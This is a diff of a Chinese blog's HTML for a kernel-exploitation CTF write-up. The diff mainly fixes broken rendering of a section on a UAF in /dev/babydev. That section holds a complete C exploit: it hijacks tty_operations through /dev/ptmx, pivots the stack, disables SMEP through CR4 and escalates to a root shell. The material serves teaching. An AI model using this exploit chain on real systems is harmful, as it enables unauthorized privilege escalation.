@@ -204,7 +204,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      5.8k 字
+      5.6k 字
     </span>
   
 
@@ -214,7 +214,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      84
+      81
        分钟
     </span>
   
@@ -835,155 +835,142 @@ poweroff -d 0  -f</code></pre>
 <p>那么我们不难想到的是我们可以通过UAF劫持<code>/dev/ptmx</code>这个设备的<code>tty_struct</code>结构体与其内部的<code>tty_operations</code>结构体，那么在我们对这个设备进行相应操作（如write、ioctl）时便会执行我们布置好的恶意函数指针</p>
 <p>由于没有开启SMAP保护，故我们可以在用户态进程的栈上布置ROP链与<code>fake tty_operations</code>结构体</p>
 <blockquote>
-<pre><code class="hljs tty_struct```位于```include/linux/tty.h```中，```tty_operations```位于```include/linux/tty_driver.h```中">
-内核中没有类似&#96;&#96;&#96;one_gadget&#96;&#96;&#96;一类的东西，因此为了完成ROP我们还需要进行一次**栈迁移**
-
-使用gdb进行调试，观察内核在调用我们的恶意函数指针时各寄存器的值，我们在这里选择劫持&#96;&#96;&#96;tty_operaionts&#96;&#96;&#96;结构体到用户态的栈上，并选择任意一条内核gadget作为fake tty函数指针以方便下断点：
-
-![image.png](https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;16&#x2F;iKBLSsbPT9zcNqQ.png)
-
-我们不难观察到，在我们对tty设备进行写入，调用&#96;&#96;&#96;tty_operations&#96;&#96;&#96;中的函数指针时，**其rax寄存器中存放的便是tty\_operations结构体的地址**，因此若是我们能够在内核中找到形如&#96;&#96;&#96;mov rsp, rax&#96;&#96;&#96;的gadget，便能够成功地将栈迁移到&#96;&#96;&#96;tty_operations&#96;&#96;&#96;结构体的开头
-
-使用ROPgadget查找相关gadget，发现有两条符合我们要求的gadget：
-
-![image.png](https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;16&#x2F;o4c9ryjOBAkit8W.png)
-
-gdb调试，发现第一条gadget其实等价于&#96;&#96;&#96;mov rsp, rax ; dec ebx ; ret&#96;&#96;&#96;：
-
-![image.png](https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;16&#x2F;Qd2sk6TngZa5EDR.png)
-
-那么利用这条gadget我们便可以很好地完成栈迁移的过程，执行我们所构造的ROP链
-
-而&#96;&#96;&#96;tty_operations&#96;&#96;&#96;结构体开头到其write指针间的空间较小，因此我们还需要进行二次栈迁移，这里随便选一条改rax的gadget即可
-
-![image.png](https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;16&#x2F;7bROpernV1lSIjs.png)
-
-需要注意的是**计算相应结构体大小时应当选取与题目相同版本的内核源码**
-
-最终的exploit应当如下：
-
-&#96;&#96;&#96;c
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;sys&#x2F;types.h&gt;
-
-#define POP_RDI_RET 0xffffffff810d238d
-#define POP_RAX_RET 0xffffffff8100ce6e
-#define MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80
-#define MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5
-#define SWAPGS_POP_RBP_RET 0xffffffff81063694
-#define IRETQ_RET 0xffffffff814e35ef
-
-size_t commit_creds &#x3D; NULL, prepare_kernel_cred &#x3D; NULL;
-
-size_t user_cs, user_ss, user_rflags, user_sp;
-
-void saveStatus()
-&#123;
-   __asm__(&quot;mov user_cs, cs;&quot;
-           &quot;mov user_ss, ss;&quot;
-           &quot;mov user_sp, rsp;&quot;
-           &quot;pushf;&quot;
-           &quot;pop user_rflags;&quot;
-           );
-   printf(&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;);
-&#125;
-
-void getRootPrivilige(void)
-&#123;
-   void * (*prepare_kernel_cred_ptr)(void *) &#x3D; prepare_kernel_cred;
-   int (*commit_creds_ptr)(void *) &#x3D; commit_creds;
-   (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
-&#125;
-
-void getRootShell(void)
-&#123;   
-   if(getuid())
-   &#123;
-       printf(&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;);
-       exit(-1);
-   &#125;
-
-   printf(&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;);
-   system(&quot;&#x2F;bin&#x2F;sh&quot;);
-&#125;
-
-int main(void)
-&#123;
-   printf(&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;);
-   saveStatus();
-
-   &#x2F;&#x2F;get the addr
-   FILE* sym_table_fd &#x3D; fopen(&quot;&#x2F;proc&#x2F;kallsyms&quot;, &quot;r&quot;);
-   if(sym_table_fd &lt; 0)
-   &#123;
-       printf(&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;);
-       exit(-1);
-   &#125;
-   char buf[0x50], type[0x10];
-   size_t addr;
-   while(fscanf(sym_table_fd, &quot;%llx%s%s&quot;, &amp;addr, type, buf))
-   &#123;
-       if(prepare_kernel_cred &amp;&amp; commit_creds)
-           break;
-
-       if(!commit_creds &amp;&amp; !strcmp(buf, &quot;commit_creds&quot;))
-       &#123;
-           commit_creds &#x3D; addr;
-           printf(&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;, commit_creds);
-           continue;
-       &#125;
-
-       if(!strcmp(buf, &quot;prepare_kernel_cred&quot;))
-       &#123;
-           prepare_kernel_cred &#x3D; addr;
-           printf(&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;, prepare_kernel_cred);
-           continue;
-       &#125;
-   &#125;
-
-   size_t rop[0x20], p &#x3D; 0;
-   rop[p++] &#x3D; POP_RDI_RET;
-   rop[p++] &#x3D; 0x6f0;
-   rop[p++] &#x3D; MOV_CR4_RDI_POP_RBP_RET;
-   rop[p++] &#x3D; 0;
-   rop[p++] &#x3D; getRootPrivilige;
-   rop[p++] &#x3D; SWAPGS_POP_RBP_RET;
-   rop[p++] &#x3D; 0;
-   rop[p++] &#x3D; IRETQ_RET;
-   rop[p++] &#x3D; getRootShell;
-   rop[p++] &#x3D; user_cs;
-   rop[p++] &#x3D; user_rflags;
-   rop[p++] &#x3D; user_sp;
-   rop[p++] &#x3D; user_ss;
-
-   size_t fake_op[0x30];
-   for(int i &#x3D; 0; i &lt; 0x10; i++)
-       fake_op[i] &#x3D; MOV_RSP_RAX_DEC_EBX_RET;
-
-   fake_op[0] &#x3D; POP_RAX_RET;
-   fake_op[1] &#x3D; rop;
-
-   int fd1 &#x3D; open(&quot;&#x2F;dev&#x2F;babydev&quot;, 2);
-   int fd2 &#x3D; open(&quot;&#x2F;dev&#x2F;babydev&quot;, 2);
-
-   ioctl(fd1, 0x10001, 0x2e0);
-   close(fd1);
-
-   size_t fake_tty[0x20];
-   int fd3 &#x3D; open(&quot;&#x2F;dev&#x2F;ptmx&quot;, 2);
-   read(fd2, fake_tty, 0x40);
-   fake_tty[3] &#x3D; fake_op;
-   write(fd2, fake_tty, 0x40);
-
-   write(fd3, buf, 0x8);
-
-   return 0;
-&#125;</code></pre>
+<p>结构体<code>tty_struct</code>位于<code>include/linux/tty.h</code>中，<code>tty_operations</code>位于<code>include/linux/tty_driver.h</code>中</p>
 </blockquote>
+<p>内核中没有类似<code>one_gadget</code>一类的东西，因此为了完成ROP我们还需要进行一次<strong>栈迁移</strong></p>
+<p>使用gdb进行调试，观察内核在调用我们的恶意函数指针时各寄存器的值，我们在这里选择劫持<code>tty_operaionts</code>结构体到用户态的栈上，并选择任意一条内核gadget作为fake tty函数指针以方便下断点：</p>
+<p><img src="https://i.loli.net/2021/03/16/iKBLSsbPT9zcNqQ.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>我们不难观察到，在我们对tty设备进行写入，调用<code>tty_operations</code>中的函数指针时，<strong>其rax寄存器中存放的便是tty_operations结构体的地址</strong>，因此若是我们能够在内核中找到形如<code>mov rsp, rax</code>的gadget，便能够成功地将栈迁移到<code>tty_operations</code>结构体的开头</p>
+<p>使用ROPgadget查找相关gadget，发现有两条符合我们要求的gadget：</p>
+<p><img src="https://i.loli.net/2021/03/16/o4c9ryjOBAkit8W.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>gdb调试，发现第一条gadget其实等价于<code>mov rsp, rax ; dec ebx ; ret</code>：</p>
+<p><img src="https://i.loli.net/2021/03/16/Qd2sk6TngZa5EDR.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>那么利用这条gadget我们便可以很好地完成栈迁移的过程，执行我们所构造的ROP链</p>
+<p>而<code>tty_operations</code>结构体开头到其write指针间的空间较小，因此我们还需要进行二次栈迁移，这里随便选一条改rax的gadget即可</p>
+<p><img src="https://i.loli.net/2021/03/16/7bROpernV1lSIjs.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>需要注意的是<strong>计算相应结构体大小时应当选取与题目相同版本的内核源码</strong></p>
+<p>最终的exploit应当如下：</p>
+<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RAX_RET 0xffffffff8100ce6e</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff81063694</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span>
+
+<span class="hljs-keyword">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;
+
+<span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span>
+            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span>
+            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span>
+            <span class="hljs-string">&quot;pushf;&quot;</span>
+            <span class="hljs-string">&quot;pop user_rflags;&quot;</span>
+            );
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-keyword">void</span> *) = prepare_kernel_cred;
+    <span class="hljs-keyword">int</span> (*commit_creds_ptr)(<span class="hljs-keyword">void</span> *) = commit_creds;
+    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>
+<span class="hljs-function"></span>&#123;   
+    <span class="hljs-keyword">if</span>(getuid())
+    &#123;
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+    &#125;
+
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);
+    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);
+    saveStatus();
+
+    <span class="hljs-comment">//get the addr</span>
+    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);
+    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)
+    &#123;
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+    &#125;
+    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];
+    <span class="hljs-keyword">size_t</span> addr;
+    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))
+    &#123;
+        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)
+            <span class="hljs-keyword">break</span>;
+
+        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))
+        &#123;
+            commit_creds = addr;
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);
+            <span class="hljs-keyword">continue</span>;
+        &#125;
+
+        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))
+        &#123;
+            prepare_kernel_cred = addr;
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);
+            <span class="hljs-keyword">continue</span>;
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">size_t</span> rop[<span class="hljs-number">0x20</span>], p = <span class="hljs-number">0</span>;
+    rop[p++] = POP_RDI_RET;
+    rop[p++] = <span class="hljs-number">0x6f0</span>;
+    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;
+    rop[p++] = <span class="hljs-number">0</span>;
+    rop[p++] = getRootPrivilige;
+    rop[p++] = SWAPGS_POP_RBP_RET;
+    rop[p++] = <span class="hljs-number">0</span>;
+    rop[p++] = IRETQ_RET;
+    rop[p++] = getRootShell;
+    rop[p++] = user_cs;
+    rop[p++] = user_rflags;
+    rop[p++] = user_sp;
+    rop[p++] = user_ss;
+
+    <span class="hljs-keyword">size_t</span> fake_op[<span class="hljs-number">0x30</span>];
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)
+        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;
+
+    fake_op[<span class="hljs-number">0</span>] = POP_RAX_RET;
+    fake_op[<span class="hljs-number">1</span>] = rop;
+
+    <span class="hljs-keyword">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);
+    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);
+
+    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>);
+    close(fd1);
+
+    <span class="hljs-keyword">size_t</span> fake_tty[<span class="hljs-number">0x20</span>];
+    <span class="hljs-keyword">int</span> fd3 = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, <span class="hljs-number">2</span>);
+    read(fd2, fake_tty, <span class="hljs-number">0x40</span>);
+    fake_tty[<span class="hljs-number">3</span>] = fake_op;
+    write(fd2, fake_tty, <span class="hljs-number">0x40</span>);
+
+    write(fd3, buf, <span class="hljs-number">0x8</span>);
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+&#125;</code></pre>
+
 <p>本地打包，运行，成功提权到root</p>
 <p><img src="https://i.loli.net/2021/03/16/b31pgOZQydFAEoM.png" srcset="/img/loading.gif" alt="image.png"></p>
 <h1 id="0x04-Kernel-ROP-ret2dir"><a href="#0x04-Kernel-ROP-ret2dir" class="headerlink" title="0x04.Kernel ROP - ret2dir"></a>0x04.Kernel ROP - ret2dir</h1><blockquote>
